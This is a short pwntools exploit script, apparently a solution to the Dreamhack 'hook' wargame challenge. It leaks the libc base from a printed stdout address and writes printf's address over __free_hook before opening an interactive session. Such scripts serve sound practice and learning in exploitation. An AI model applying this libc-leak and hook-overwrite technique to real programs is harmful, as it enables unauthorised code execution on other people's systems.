from pwn import *

p = remote("host3.dreamhack.games", 12848)
e = ELF("./hook")
libc = ELF("libc-2.23.so")

p.recvuntil(b"stdout: ")
stdout = int(p.recvline(), 16)
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
printf = libc_base + libc.symbols["printf"]
print(hex(libc_base))

p.sendline(b"16")

hook = libc_base + libc.symbols["__free_hook"]

payload = p64(hook) + p64(printf)

p.sendlineafter(b"Data: ", payload)

p.interactive()